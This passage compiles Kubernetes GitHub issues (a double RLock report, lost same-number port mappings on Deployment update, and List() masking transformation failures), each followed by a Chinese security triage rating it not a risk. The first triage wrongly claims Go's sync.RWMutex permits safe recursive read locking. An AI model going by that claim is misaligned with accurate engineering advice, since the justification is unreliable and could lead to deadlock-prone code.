The bug is found by running the Intelligent Code Repair (iCR) tool by [OpenRefactory, Inc.](https://openrefactory.com/) and then manually triaging the results.

#### Kubernetes version

<details>

```console
$ kubectl version
# paste output here
```

</details>


#### Cloud provider

<details>

</details>


#### OS version

*No response*

#### Install tools

*No response*

#### Container runtime (CRI) and version (if applicable)

*No response*

#### Related plugins (CNI, CSI, ...) and versions (if applicable)

*No response*

### 分析结果

**风险定级：**  
不涉及

**判断依据：**  
该Issue讨论了在Go语言中可能存在的双重读取锁定（RLock）的问题。根据Go语言官方文档，sync.RWMutex允许同一协程多次获取读取锁（RLock），这是安全的，不会导致死锁或其他问题。因此，Issue中提到的双重获取读取锁定在实际中并不构成安全风险。根据风险判断标准，此Issue不涉及安全问题。

---

## Issue #127813 Deployment with multiple port mappings with same port number but different protocol fails to update properly

- Issue 链接：[#127813](https://github.com/kubernetes/kubernetes/issues/127813)

### Issue 内容

#### What happened?

When updating a Deployment and adding two port mappings with the same port number, but with a different protocol, only one of the mappings is created. `kubectl diff` does not detect a difference between the manifest and what's deployed. However, when applying the manifest with both port mappings from scratch, they are correctly defined. 

#### Example 

`deployment_without_ports.yaml`
<details>

```yaml
apiVersion: apps/v1
kind: Deployment
metadata:
  name: ed-example-chart
  namespace: "playground"
  labels:
    helm.sh/chart: example-chart-0.5.1
    app.kubernetes.io/name: example-chart
    app.kubernetes.io/instance: ed
    app.kubernetes.io/version: "0.2.3"
    app.kubernetes.io/managed-by: Helm
spec:
  #<...>
    spec:
      containers:
        - name: http-echo
          image: #<...>
          imagePullPolicy: IfNotPresent
          args:
            - -text="hello I'm httpEcho"
          ports:
            - containerPort: 80
              name: http
              protocol: TCP
    #<...>
``` 
</details>

`deployment_with_ports.yaml`
<details>

```yaml
apiVersion: apps/v1
kind: Deployment
metadata:
  name: ed-example-chart
  namespace: "playground"
  labels:
    helm.sh/chart: example-chart-0.5.1
    app.kubernetes.io/name: example-chart
    app.kubernetes.io/instance: ed
    app.kubernetes.io/version: "0.2.3"
    app.kubernetes.io/managed-by: Helm
spec:
  #<...>
    spec:
      containers:
        - name: http-echo
          image: #<...>
          imagePullPolicy: IfNotPresent
          args:
            - -text="hello I'm httpEcho"
          ports:
       	- containerPort: 53
              name: dns-tcp
              protocol: TCP
            - containerPort: 53
              name: dns-udp
              protocol: UDP
            - containerPort: 80
              name: http
              protocol: TCP
    #<...>
``` 
</details>

`kubectl apply -f deployment_with_ports.yaml` will give the expected result if the ressource doesn't already exist. 
However 
`kubectl apply -f deployment_without_ports.yaml` followed by `kubectl apply -f deployment_with_ports.yaml` will give the following result. 

<details>

```yaml
apiVersion: apps/v1
kind: Deployment
metadata:
  name: ed-example-chart
  namespace: "playground"
  labels:
    helm.sh/chart: example-chart-0.5.1
    app.kubernetes.io/name: example-chart
    app.kubernetes.io/instance: ed
    app.kubernetes.io/version: "0.2.3"
    app.kubernetes.io/managed-by: Helm
spec:
  #<...>
    spec:
      containers:
        - name: http-echo
          image: #<...>
          imagePullPolicy: IfNotPresent
          args:
            - -text="hello I'm httpEcho"
          ports:
            - containerPort: 53
              name: dns-tcp
              protocol: TCP
			# Missing port mapping here
            - containerPort: 80
              name: http
              protocol: TCP
    #<...>
``` 
</details>

#### What did you expect to happen?

I would expect the update to the manifest to be configured with both container port mappings, like it is when creating the initial deployment. 

#### How can we reproduce it (as minimally and precisely as possible)?

- First, create a Deployment manifest with the following container port mappings 
```yaml
ports:
  - containerPort: 80
    name: http
    protocol: TCP
```
- Then create another one, identical with the following container port mappings 
```yaml
ports:
  - containerPort: 53
    name: dns-tcp
    protocol: TCP
  - containerPort: 53
    name: dns-udp
    protocol: UDP
  - containerPort: 80
    name: http
    protocol: TCP
```
- Apply first manifest, then second
- `kubectl get deploy <deploy-name> -o yaml`
- The result will be missing one of the `53` port mappings
- Delete the `Deployment`
- Apply second manifest
- It will contain all expected port mappings

#### Anything else we need to know?

_No response_

#### Kubernetes version

Tested with two Kubernetes versions
<details>

```console
$ kubectl version
Client Version: version.Info{Major:"1", Minor:"21", GitVersion:"v1.21.14", GitCommit:"0f77da5bd4809927e15d1658fb4aa8f13ad890a5", GitTreeState:"clean", BuildDate:"2022-06-15T14:17:29Z", GoVersion:"go1.16.15", Compiler:"gc", Platform:"darwin/arm64"}
Server Version: version.Info{Major:"1", Minor:"21", GitVersion:"v1.21.12", GitCommit:"696a9fdd2a58340e61e0d815c5769d266fca0802", GitTreeState:"clean", BuildDate:"2022-04-13T19:01:10Z", GoVersion:"go1.16.15", Compiler:"gc", Platform:"linux/amd64"}
```

</details>
<details>

```console
$ kubectl version
Client Version: v1.29.9
Kustomize Version: v5.0.4-0.20230601165947-6ce0bf390ce3
Server Version: v1.29.1
```

</details>


#### Cloud provider

<details>
For 1.21, cluster is onprem
For 1.29, cluster is on Oracle Kubernetes Engine
</details>


#### OS version

<details>

```console
$ sw_vers
ProductName:		macOS
ProductVersion:		14.6.1
BuildVersion:		23G93
$ uname -a
Darwin ccoupaljette-MBP 23.6.0 Darwin Kernel Version 23.6.0: Mon Jul 29 21:14:30 PDT 2024; root:xnu-10063.141.2~1/RELEASE_ARM64_T6000 arm64
```

</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### 分析结果

**风险定级：**  
不涉及

**判断依据：**  
该Issue描述了在对Kubernetes Deployment进行更新时，如果添加了具有相同端口号但不同协议的多个端口映射，只有一个映射被创建。`kubectl diff`未检测到清单和已部署资源之间的差异。这导致预期的端口映射未正确更新。这是一个功能性错误，但并不涉及安全风险。根据提供的风险判断标准，此问题不属于安全风险。

---

## Issue #127772 Listing doesn't fail if a resource of the returned set permafails to transform

- Issue 链接：[#127772](https://github.com/kubernetes/kubernetes/issues/127772)

### Issue 内容

#### What happened?

If data transformation suddenly starts failing on a resource from a set that is returned by a List() query, the user is not notified of these failures, but is presented with the latest known version of the resource. That happens even after new, properly readable resources get added and appear in the returned set.

Get() fails correctly on the failing resource.

#### What did you expect to happen?

I expected `List()` to notify me about issues reading a resource.

#### How can we reproduce it (as minimally and precisely as possible)?

1. run the API server with etcd encryption turned on
2. rewrite your EncryptionConfiguration by replacing the key in the encryption provider
3. wait for the changes to take effect - `Get()` a resource that was previously encrypted until the `Get()` fails with an internal error
4. issue a `List()` request that contains the resource that was previously failing on `Get()`

Alternatively, you can apply the patch from the attachment that adds an integration test and 
[0001-list-broken-proof.txt](https://github.com/user-attachments/files/17202520/0001-list-broken-proof.txt)

```
make test-integration WHAT=./test/integration/controlplane/transformation GOFLAGS="-v" KUBE_TEST_ARGS='-run ^TestBrokenTransformations$'
```

#### Anything else we need to know?

I wonder if it would be possible to allow `.patch` attachments so that patches don't have to be sent as .txt files.

#### Kubernetes version

master


#### Cloud provider

irrelevant


#### OS version

_No response_

#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### 分析结果

**风险定级：**  
不涉及

**判断依据：**  
该Issue描述了在使用`List()`函数获取资源列表时，如果某个资源在数据转换过程中失败，`List()`函数并不会通知用户这些失败，而是呈现该资源的最新已知版本。`Get()`函数在获取该失败的资源时，能够正确地返回错误。

根据风险判断标准：

1. 该问题不会被攻击者利用，不存在攻击者可以利用的漏洞。
2. 不会导致权限提升、命令执行、信息泄露等高风险安全问题，也不符合分配CVE编号并达到CVSS 3.1评分标准为High以上的条件。
3. 该问题主要涉及到用户对错误信息的感知，不属于安全风险。

因此，风险评级判断为不涉及。

---

